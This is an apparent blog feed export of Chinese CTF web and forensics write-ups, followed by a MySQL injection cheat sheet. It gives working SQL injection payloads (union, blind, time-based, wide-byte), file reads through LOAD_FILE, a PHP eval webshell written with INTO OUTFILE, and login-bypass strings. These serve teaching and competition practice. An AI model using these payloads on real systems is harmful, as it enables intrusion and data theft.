      <content type="text"><![CDATA[单刷好幸苦。 Nothing here12Nothing here !http://52.53.151.123/web/web5.php 访问后查看源代码，注释中有：1QnVnc19CdW5ueXs1MjljNDI5YWJkZTIxNzFkMGEyNTU4NDQ3MmFmODIxN30K base64解码，得到flag：1Bugs_Bunny&#123;529c429abde2171d0a25584472af8217&#125; Encryption12You know your jobhttp://52.53.151.123/web/web30.php 访问后题目说Only users of “Bugs_Bunny Browser” may access this page.。所以抓包改User-Agent。 1flag=zn8XhqnlBRBetevoFcSQAw0OMVH6Kwj23svbneF1%2B5gDfBdn9osZBfB06cTub4ARg3OTTjsBIG7x; 中间有个%2B，是+号。在https://hashkiller.co.uk/text-encryption.aspx 上，用密码Hashkiller解密。得到flag：1Bugs_Bunny&#123;hashkiller_has_a_custom_encryption_ algorithm&#125; Old php vuln !1234Hey ,AgentYour mission is to hack this secure portal .Good luck.http://52.53.151.123/web/web35.php SimplePHP12345PHP for noobs :p ?Maybe not this time :Dhttp://34.253.165.46/SimplePhp/index.phpsource : http://34.253.165.46/SimplePhp/index.txt 题目提供了源码：1234567891011121314151617181920212223242526272829&lt;?phpinclude "flag.php";$_403 = "Access Denied";$_200 = "Welcome Admin";if ($_SERVER["REQUEST_METHOD"] != "POST") die("BugsBunnyCTF is here :p...");if ( !isset($_POST["flag"]) ) die($_403);foreach ($_GET as $key =&gt; $value) $$key = $$value;foreach ($_POST as $key =&gt; $value) $$key = $value;if ( $_POST["flag"] !== $flag ) die($_403);echo "This is your flag : ". $flag . "\n";die($_200);?&gt; 有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中有把$flag直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个die($_200)，结合第一个foreach的功能，我们可以在第二个foreach之前先将$_200的值覆盖为原flag的值。payload如下：1234http://34.253.165.46/SimplePhp/index.php?_200=flagPOST:flag=1 得到flag：1Bugs_Bunny&#123;Simple_PHP_1s_re4lly_fun_!!!&#125; 利用前面的die($_403)也可以实现。我们先把原flag的值覆盖到$_403上，然后构造$_POST[&quot;flag&quot;] !== $flag，从而die($_403)输出flag。payload如下：1234http://34.253.165.46/SimplePhp/index.php?_403=flag&amp;_POST=1POST:flag= 同样能获得flag。 Web100前端加密问题。部分代码如下：123456var h = prompt("Please enter your passowrd");if(generate(h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13])==_&amp;&amp;generate(h[15]+h[10]+h[3]+h[5]+h[6])==__&amp;&amp;generate(h[16]+h[12]+h[14]+h[2]+h[7])==___)&#123; alert('your flag is Bugs_Bunny&#123;'+h+'&#125;');&#125;else&#123; alert('I\'m sorry my son it\' not easy');&#125; 经过初步调试后几个重要的值如下：12345_ = 6b07fd4ea837c39e1542e1bbca01a224__ = 20ee80e63596799a1543bc9fd88d8878___ = 21232f297a57a5a743894a0e4a801fc3 而generate在逆向后发现是md5加密。在google上查到对应的md5解密对应如下：123md5(tunisia) = 6b07fd4ea837c39e1542e1bbca01a224md5(bunny) = 20ee80e63596799a1543bc9fd88d8878md5(admin) = 21232f297a57a5a743894a0e4a801fc3 所以有如下对应关系：12345678h[11]+h[8]+h[1]+h[0]+h[9]+h[4]+h[13] t u n i s i ah[15]+h[10]+h[3]+h[5]+h[6] b u n n yh[16]+h[12]+h[14]+h[2]+h[7] a d m i n 得到的h为：1inininynusutdamba 最后的flag为：1Bugs_Bunny&#123;inininynusutdamba&#125; LQI_X1http://34.253.165.46/LQI_X 给了个登陆框，应有存在注入。 Walk walk1http://www.chouaibhm.me 发现是asw s3服务，存在未授权/信息泄露漏洞，可见Awesome CTF Book:AWS 漏洞系列。访问:1http://www.chouaibhm.me.s3.amazonaws.com/ Calculator随便进行了一些功能测试，比如点1+2，则抓包会发现有data字段时我们输入的表达式，forward掉后返回结果。驶入的表达式只允许输入数字，中小括号，感叹号，乘号，减号。猜测后端用eval执行。一开始我以为xss，将payload进行一次jsfuck加密后能绕过过滤，不过没啥用等。然后有一次的payload过长，返回的报错信息：1234567891011Error: spawn E2BIG at exports._errnoException (util.js:1018:11) at ChildProcess.spawn (internal/child_process.js:319:11) at exports.spawn (child_process.js:378:9) at Object.exports.execFile (child_process.js:143:15) at exports.exec (child_process.js:103:18) at /app/apps.js:47:11 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) 所以后端是用node.js。推测是要渗透nodojs。参考Reverse shell on a Node.js application和Pentesting Node.js Application : Nodejs Application Security 进行渗透，不过可惜没有成功。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[zctf2017-EasyReverse-writeup]]></title>
      <url>%2F2017%2F07%2F29%2Fzctf2017-EasyReverse-writeup%2F</url>
      <content type="text"><![CDATA[未完待续题目给了一个dll文件。用IDA打开，shift+F12查看字符串。 比如说有个yes字符串，双击进去。 后面的DATA XREF: get_string+74o指明了引用该字符串的地址。双击跳转到代码段(.text)。利用f5汇编功能]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[机器学习算法：最近邻(KNN)]]></title>
      <url>%2F2017%2F07%2F25%2F%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%EF%BC%9A%E6%9C%80%E8%BF%91%E9%82%BB-KNN%2F</url>
      <content type="text"><![CDATA[机器学习算法：最近邻(KNN) 原理算法tensorflowsklearn123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869import numpy as npimport pandas as pdfrom sklearn.datasets import load_breast_cancerfrom sklearn.model_selection import train_test_splitfrom sklearn.neighbors import KNeighborsClassifiercancer = load_breast_cancer()print(cancer.DESCR)def convertToDataframe():feature = cancer['feature_names']df = pd.DataFrame(cancer.data,index=range(569),columns=feature)df['target'] = cancer.targetreturn dfprint("Now convert the dataset into dataframe:\n")cancerdf = convertToDataframe()print(cancerdf.head())def classDistribution(cancerdf):malignant = len(cancerdf[cancerdf['target']==0])benign = len(cancerdf[cancerdf['target']==1])index = ['malignant', 'benign']target = pd.Series([malignant,benign],index=index)return targetdef splitDataset(cancerdf):X = cancerdf[cancerdf.columns[:30]]y = cancerdf[cancerdf.columns[30]]X_train,X_test, y_train, y_test = train_test_split(X,y,random_state = 0)return X_train, X_test, y_train, y_testdef trainKNN(feature_data,class_data,k):knn = KNeighborsClassifier(n_neighbors=k)knn.fit(feature_data,class_data)return knnprint("\nThe class distribution is:\n")print(classDistribution(cancerdf))print("\nUsing train_test_split, split X and y into training and test sets (X_train, X_test, y_train, and y_test).using random_state=0\n")X_train, X_test, y_train, y_test = splitDataset(cancerdf)print("X_train: " ,X_train.shape)print("X_test: " ,X_test.shape)print("y_train: " ,y_train.shape)print("y_test: ", y_test.shape)print("Now, training the Knn model: done!\n")knn = trainKNN(X_train,y_train,1)print("Predict the class label using the mean value for each feature.\n")print("The mean value for each feature.\n")means = cancerdf.mean()print(means)means = means[:-1].values.reshape(1, -1)means_predict = knn.predict(means)print("The predict result : ",means_predict)print("Predict the class labels for the test set X_test")test_predict = knn.predict(X_test)print("The prediction result ：\n",test_predict)print("The prediction result accuracy : ",knn.score(X_test,y_test))]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[实验吧-web-writeup]]></title>
      <url>%2F2017%2F07%2F24%2F%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup%2F</url>
      <content type="text"><![CDATA[实验吧-web-writeup（持续更新） 登陆一下好吗payload:1username=&apos;=&apos; &amp;password=&apos; = &apos; 后端查询语句注入为:1select XXX from XXX where user = &apos; &apos;=&apos; &apos; AND pass = &apos; &apos;=&apos; &apos; 得到flag：1ctf&#123;51d1bf8fb65a8c2406513ee8f52283e7&#125; who are you?考点：基于时间的盲注，insert注入ip伪装技巧：12345X-Forwarded-ForClient-IPx-remote-IPx-originating-IPx-remote-addr 因缺思汀的绕过查看源代码。注释中有：1source: source.txt 访问得到源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;"; echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;"; echo '&lt;/form&gt;'."&lt;br/&gt;"; echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match("/".$ArrReq."/is",$StrValue)==1)&#123; print "水可载舟，亦可赛艇！"; exit(); &#125;&#125;$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db="XXXXXX";mysql_select_db($db, $con);$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql);if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "亦可赛艇！"; &#125;&#125;else&#123; print "一颗赛艇！";&#125;mysql_close($con);?&gt; 用到mysql中的with rollup技巧。用普通的select查询下；1234567mysql&gt; SELECT uname,pass FROM test.table;+---------+------+| uname | pass |+---------+------+| chybeta | 123 |+---------+------+1 row in set (0.00 sec) 在加上group by pass with rollup后12345678mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup;+---------+------+| uname | pass |+---------+------+| chybeta | 123 || chybeta | NULL |+---------+------+2 rows in set (0.01 sec) rollup在查询结果中加上了一行，并且pass字段的值为NULL。这样当我们post进的pwd的值为空，就能满足$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]的条件了。 在此之前我们还有一个条件要满足mysql_num_rows($query) == 1，我们要选择pass为NULL的单独的这一条记录。从源码分析可得，过滤了逗号，我们不能简单的使用limit 1,1这样的语法，而是可以使用limit 1 offset 1。就本地环境而言，比如 1234567mysql&gt; SELECT uname,pass FROM test.table group by pass with rollup limit 1 offset 1;+---------+------+| uname | pass |+---------+------+| chybeta | NULL |+---------+------+1 row in set (0.01 sec) 最后构造出的payload如下：1uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd= 之所以为offset为2，是因为rollup是在查询结果最后加上一行，而我们通过or 1=1查询出来的不知道有多少行，所以这个2是fuzz出来的。 最后flag：1CTF&#123;with_rollup_interesting&#125; 简单的sql注入1http://ctf5.shiyanbar.com/423/web/ Once More1234567891011121314151617181920212223&lt;?phpif (isset ($_GET[&apos;password&apos;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) &#123; echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;; &#125; else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) &#123; if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) &#123; die(&apos;Flag: &apos; . $flag); &#125; else &#123; echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); &#125; &#125; else &#123; echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; &#125;&#125;?&gt; 第一层判断通过ereg，要求只能出现字母和数字，但ereg有缺陷，可以用%00绕过。第二层判断要求位数少但要大于9999999，可以利用科学计数法。最里层要求出现*-*，用%00后面再加上即可。payload:12http://ctf5.shiyanbar.com/web/more.php?password=9e9%00*-* flag：1CTF&#123;Ch3ck_anD_Ch3ck&#125; Guess Next Session1http://ctf5.shiyanbar.com/web/Session.php 给了源代码123456789101112&lt;?phpsession_start();if (isset ($_GET[&apos;password&apos;])) &#123; if ($_GET[&apos;password&apos;] == $_SESSION[&apos;password&apos;]) die (&apos;Flag: &apos;.$flag); else print &apos;&lt;p&gt;Wrong guess.&lt;/p&gt;&apos;;&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; 预测是个幌子。session_start() 基于PHPSESSID=oso27id67fqu8hbvq57bacahn3作为身份认证信息，所以我们随便在PHPSESSID中加几个字母，这时服务器端的$_SESSION[&#39;password&#39;]为空，然后我们的password再置为空， 然后就得到了flag： FALSE1http://ctf5.shiyanbar.com/web/false.php 给了源码：123456789101112&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; 输入的name和password不能一样，之后的sha1比较用了===，不存在弱类型问题。但sha1不能处理数组，当我们传入name[]=1&amp;password[]=2时，会造成sha1(Array) === sha1(Array)，即NULL===NULL，从而吐出flag。本地测试如下：1234&lt;?php$name = $_GET[&apos;name&apos;];var_dump(@sha1($name));?&gt; payload：1http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2 上传绕过上传路径截断。 burp抓包，修改为 uploads/cap.php .jpg 转到hex编码，将空格20，改为00 发包。 1flag&#123;SimCTF_huachuan&#125; 程序逻辑问题1http://ctf5.shiyanbar.com/web/5/index.php 访问后查看源代码，有个index.txt。得到源码：1234567891011121314151617181920212223242526272829&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;); mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . mysql_error($conn));&#125;$user = $_POST[user];$pass = md5($_POST[pass]);$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;$query = mysql_query($sql);if (!$query) &#123; printf(&quot;Error: %s\n&quot;, mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[&quot;pw&quot;]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;&#125;else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; 对$user没有过滤，尝试报错注入：1user=&apos;and extractvalue(1, concat(0x5c, (select pw from phpformysql.php limit 1)))#&amp;pass=1 结果很尴尬：1welcome to simplexue Error: SELECT command denied to user &apos;web6lo&apos;@&apos;localhost&apos; for table &apos;php&apos; 好吧题目既然说是逻辑漏洞，接下来那就找咯。可以看到它的用户名和密码是分开判断的。并且用户名处存在注入。所以思路如下，我们给用户名传入：1user=&apos; union select &quot;0e830400451993494058024219903391&quot; 构成的sql语句为：1select pw from php where user=&apos; &apos; union select &quot;0e830400451993494058024219903391&quot; 第一个查询结果为空，所以结果返回的是我们传入的0e830400451993494058024219903391，即此时，$row[pw]=0e830400451993494058024219903391。而md5(QNKCDZO)正是该0e字符串值。 最后的payload:1user=&apos; union select &quot;0e830400451993494058024219903391&quot;#&amp;pass=QNKCDZO 得到flag：1SimCTF&#123;youhaocongming&#125; what a fuck!这是什么鬼东西?jsfuck。f12里控制台运行一下，得到flag：1Ihatejs php大法好访问1http://ctf5.shiyanbar.com/DUTCTF/index.php 得到提示：1Can you authenticate to this website? index.php.txt 访问，得到源码：1234567891011121314151617&lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125;?&gt;&lt;br&gt;&lt;br&gt;Can you authenticate to this website? 二次解码。payload：12345payload 1:http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%25%36%38%25%36%31%25%36%33%25%36%62%25%36%35%25%37%32%25%34%34%25%34%61payload 2:http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a flag:1DUTCTF&#123;PHP_is_the_best_program_language&#125; 这个看起来有点难经过fuzz，可以知道是整数型注入。1http://ctf5.shiyanbar.com/8/index.php?id=1 union select 1,database() 得到表名。1http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() 得到列名1http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x746869736b6579 得到flag：1http://ctf5.shiyanbar.com/8/index.php?id=1 UNION SELECT 1,GROUP_CONCAT(k0y+SEPARATOR+0x3c62723e) FROM thiskey flag:1whatiMyD91dump 貌似有点难1http://ctf5.shiyanbar.com/phpaudit/ 题目提供了源码:123456789101112131415161718192021&lt;?phpfunction GetIP()&#123;if(!empty($_SERVER["HTTP_CLIENT_IP"])) $cip = $_SERVER["HTTP_CLIENT_IP"];else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) $cip = $_SERVER["HTTP_X_FORWARDED_FOR"];else if(!empty($_SERVER["REMOTE_ADDR"])) $cip = $_SERVER["REMOTE_ADDR"];else $cip = "0.0.0.0";return $cip;&#125;$GetIPs = GetIP();if ($GetIPs=="1.1.1.1")&#123;echo "Great! Key is *********";&#125;else&#123;echo "错误！你的IP不在访问列表之内！";&#125;?&gt; 抓包，添加X-Forwarded-For: 1.1.1.1 得到flag：1SimCTF&#123;daima_shengji&#125; 猫捉老鼠 1#WWWnsf0cus_NET# forbiden题目说:Make sure you are in HongKong抓包，修改：1Accept-Language: zh-hk 得到flag：1123JustUserAGent]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[0ctf-2015-Peers-writeup]]></title>
      <url>%2F2017%2F07%2F23%2F0ctf-2015-Peers-writeup%2F</url>
      <content type="text"><![CDATA[0ctf-2015-Peers-writeup 题目题目提供了一个流量包peers.pcapng，peers.pcapng:链接：http://pan.baidu.com/s/1nuGXACL 密码：zwl3 分析用wireshark的追踪tcp流查看。 可以看到这是关于BitTorrent协议的包。wireshark中有针对BitTorrent protocol的协议解析器。但该解析器默认是工作在端口6881上，这也是BitTorrent protocol工作的常用端口。而在题目提供的流量包中，这些流量是通过80端口的，所以我们需要对流量包进行“修正”。 改端口我们可以利用tcprewrite这个工具来修改流量包。为把端口80修改为端口6881，使用下述命令：1tcprewrite --portmap=80:6881 --infile=peers.pcapng --outfile=peers_output.pcap 提取接下去就是把这些BitTorrent的内容提取出来，：）可以手动提取。比如在过滤器处先填入bittorrent.piece.index &gt;= 0，之后将三十九个数据包按照index的顺序将bittorrent.piece.data的十六进制复制到hex编辑器中。 也可以利用工具tshark。使用下面命令：1tshark -r peers_output.pcap -Y &apos;bittorrent.piece.data&apos; -Tfields -e bittorrent.piece.index -e bittorrent.piece.data &gt; pieces -r选项表示读入一个文件，-Y是用于选择过滤器，-Tfilelds用来设置输出格式。-e选项表示要列出的内容，因为我们最后要根据index来对data进行排序重组，所以有两个-e。最后我们将文件流保存到文件pieces中。 文件pieces内容如下，第一列是index，第二个是对应的data：12340x00000000 42:4d:36:c4:09:00:00.....0x00000020 69:ff:ae:84:78:ff:a6.....0x00000017 5b:ff:96:66:5a:ff:9a.....省略 重组接下去，就是根据index的顺序重组文件，用下面的脚本：123456789101112temp = &#123;&#125;peer = open("pieces","rb")result = open("result","w+")for line in peer: index = int(line[0:10],16) data = line[11:-1].replace(":","").decode("hex") temp[index] = datapeer.close()for index in sorted(temp): result.write(temp[index])result.close() 123root@chybeta:~/Desktop# python peer.pyroot@chybeta:~/Desktop# file resultresult: PC bitmap, Windows 3.x format, 800 x 200 x 32]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PHPCMS v9.6.0 任意文件上传漏洞分析]]></title>
      <url>%2F2017%2F07%2F22%2FPHPCMS-v9-6-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[环境准备在服务器上准备好要上传的文件，比如shell.txt。其访问地址为：1http://localhost:2500/shell.txt]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[MySql注入备忘录]]></title>
      <url>%2F2017%2F07%2F21%2FMySql%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95%2F</url>
      <content type="text"><![CDATA[简介所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。 基本查看当前数据库版本 VERSION() @@VERSION @@GLOBAL.VERSION 当前登录用户 USER() CURRENT_USER() SYSTEM_USER() SESSION_USER() 当前使用的数据库 DATABASE() SCHEMA() 路径相关 @@BASEDIR : mysql安装路径： @@SLAVE_LOAD_TMPDIR : 临时文件夹路径： @@DATADIR : 数据存储路径： @@CHARACTER_SETS_DIR : 字符集设置文件路径 @@LOG_ERROR : 错误日志文件路径： @@PID_FILE : pid-file文件路径 @@BASEDIR : mysql安装路径： @@SLAVE_LOAD_TMPDIR : 临时文件夹路径： 联合数据 CONCAT() GROUP_CONCAT() CONCAT_WS() 字母/数字相关 ASCII(): 获取字母的ascii码值 BIN(): 返回值的二进制串表示 CONV(): 进制转换 FLOOR() ROUND() LOWER()：转成小写字母 UPPER(): 转成大写字母 HEX():十六进制编码 UNHEX()：十六进制解码 字符串截取 MID() LEFT() SUBSTR() SUBSTRING() 注释行间注释 — - (—后面有个空格) DROP sampletable;— # DROP sampletable;# ` (反引号) 行内注释 /* */ +DROP/* 内容 */sampletable; /*! 语句 */ /*! select * from test */ 语句会被执行 注入技术判断是否存在注入假设有: www.test.com/chybeta.php?id=1 数值型注入12345chybeta.php?id=1+1chybeta.php?id=-1 or 1=1chybeta.php?id=-1 or 10-2=8chybeta.php?id=1 and 1=2chybeta.php?id=1 and 1=1 字符型注入参数被引号包围，我们需要闭合引号。1234chybeta.php?id=1&apos;chybeta.php?id=1&quot;chybeta.php?id=1&apos; and &apos;1&apos;=&apos;1chybeta.php?id=1&quot; and &quot;1&quot;=&quot;1 联合查询查询列数用UNION SELECT注入时，若后面要注出的数据的列与原数据列数不同，则会失败。所以需要先猜解列数。 UNION SELECT123UNION SELECT 1,2,3 #UNION ALL SELECT 1,2,3 #UNION ALL SELECT null,null,null # ORDER BY利用二分法1234ORDER BY 10 #ORDER BY 5 #ORDER BY 2 #.... 查询数据库1UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA # 查询表名1UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() # 假设获取到数据库名为”databasename”后，对其进行十六进制编码得到0x64617461626173656e616d65。1UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x64617461626173656e616d65 # 查询列名由前一步获取到表名为tablename后，对其进行十六进制编码得到1UNION SELECT GROUP_CONCAT(column_name SEPARATOR+0x3c62723e) FROM+INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x7461626c656e616d65 # 获取数据1UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasename.tablename # insert/update/delete注入参考：SQL Injection in Insert Update and Delete Statements假设后台语句为：1insert into user(id,name,pass) values (1,&quot;chybeta&quot;,&quot;123456&quot;); order by后注入此部分整理自瞌睡龙:MySql注入科普 oder by由于是排序语句，所以可以利用条件语句做判断，根据返回的排序结果不同判断条件的真假。 检测方法一般带有oder或者orderby的变量很可能是这种注入，在知道一个字段的时候可以采用如下方式注入： 原始链接：http://www.test.com/list.php?order=vote 根据vote字段排序。 找到投票数最大的票数num然后构造以下链接，看排序是否变化。：1list.php?order=abs(vote-(length(user())&gt;0)*num)+asc 还有一种方法不需要知道任何字段信息，使用rand函数：12list.php?order=rand(true)list.php?order=rand(false) 以上两个会返回不同的排序。 payload判断表名中第一个字符是否小于128的语句如下：1http://www.test.com/list.php?order=rand((select char(substring(table_name,1,1)) from information_schema.tables limit 1)&lt;=128)) 报错注入盲注盲注场景在许多情况下，通过前面的测试会发现页面没有回显提取的数据，但是根据语句是否执行成功与否会有一些相应的变化。 正确/错误的语句使得页面有适度的变化。可以尝试使用布尔注入 正确语句返回正常页面，错误的语句返回通用错误页面。可以尝试使用布尔注入。 提交错误语句，不影响页面的正常输出。建议尝试使用延时注入。 几种简单的判断语句，在真实利用中需要根据情况而变化: CASE IF() IFNULL() NULLIF() 布尔盲注-基于响应提交一个逻辑判断语句，来推断一个个的信息位。由于注入需要（一般）一个个字符的进行，所以需要利用脚本，或者工具（比如burp suite）。以下是： payload12345678910111213141516// i 用于提取每一个位，j 用于判断其对应的ASCII码值的范围。// k ，结合limit，选择偏移为k的行// **中可以填上其他的select语句，比如查询表名，列名，数据。一次类推。// SUBSTR() 也可以换成 SUBSTRING()&apos; OR (SELECT ASCII(SUBSTR(DATABASE(),i,1) ) &lt; j) #&apos; OR (SELECT ASCII(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) ) &lt; j) # &apos; OR (SELECT SUBSTR(DATABASE(),i,1) &lt; j) #&apos; OR (SELECT SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j) # &apos; OR SUBSTR((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT k,1),i,1) &lt; j #... 脚本脚本利用，可见：ctf盲注利用脚本要点： 注意编码问题 注意异常处理 注意边界处理 延时盲注-基于时间一般会用到几个函数。使用这些的效果，是为了延缓mysql的操作，从而检测到与平时有异的情况： SLEEP(n) 让mysql停n秒钟 BENCHMARK(count,expr) 重复countTimes次执行表达式expr 一些注意事项： 使用基于时间的盲注比较不准确，因为这还取决于当前的网络环境。 时间延缓最好不要超过30秒，否则容易导致mysql的API连接超时。 当在页面上看不到任何明显变化时，再考虑选择使用延时注入。 检测方法1234561 OR SLEEP(25)=0 LIMIT 1 #1) OR SLEEP(25)=0 LIMIT 1 #1&apos; OR SLEEP(25)=0 LIMIT 1 #&apos;) OR SLEEP(25)=0 LIMIT 1 #1)) OR SLEEP(25)=0 LIMIT 1 #SELECT SLEEP(25) # payload123456UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,BENCHMARK(100000,SHA1(1)),0)UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)... 宽字节注入原理有如下php代码：12345...mysql_query("SET NAMES 'gbk'");....$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;$sql = "SELECT * FROM test WHERE names='&#123;$name&#125;'"; addslashes()会在单引号或双引号前加上一个\。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入name=root%df%27，%在服务器端会出现如下转换：root%df%27 -&gt; root%df%5c%27 -&gt; root運&#39;。 更多内容可见：浅析白盒审计中的字符编码及SQL注入 payload吃掉\1234index.php?name=1%df&apos;index.php?name=1%a1&apos;index.php?name=1%aa&apos;... 在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉’\‘。 利用\1index.php?name=%**%5c%5c%27 二次注入文件读写利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。查询用户读写权限：1SELECT file_priv FROM mysql.user WHERE user = &apos;username&apos;; load_file()读取条件 需要有读取文件的权限 需要知道文件的绝对物理路径。 要读取的文件大小必须小于 max_allowed_packet 1SELECT @@max_allowed_packet; payload直接使用绝对路径,注意对路径中斜杠的处理。12345UNION SELECT LOAD_FILE(&quot;C://TEST.txt&quot;) #UNION SELECT LOAD_FILE(&quot;C:/TEST.txt&quot;) #UNION SELECT LOAD_FILE(&quot;C:\\TEST.txt&quot;) # 使用编码123UNION SELECT LOAD_FILE(CHAR(67,58,92,92,84,69,83,84,46,116,120,116)) #UNION SELECT LOAD_FILE(0x433a5c5c544553542e747874) # select导出条件 一般要指定绝对路径 需导出的目录有可写权限 要outfile出的文件不能已经存在 payload123UNION SELECT DATABASE() INTO OUTFILE &apos;C:\\phpstudy\\WWW\\test\\1&apos;;UNION SELECT DATABASE() INTO OUTFILE &apos;C:/phpstudy/WWW/test/1&apos;; 写入webshell条件 需要知道网站的绝对物理路径，这样导出后的webshell可访问 对需导出的目录有可写权限。 payload1UNION SELECT &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; INTO OUTFILE &apos;C:/phpstudy/WWW/test/webshell.php&apos;; 万能密码后台登陆 admin’ — admin’ # 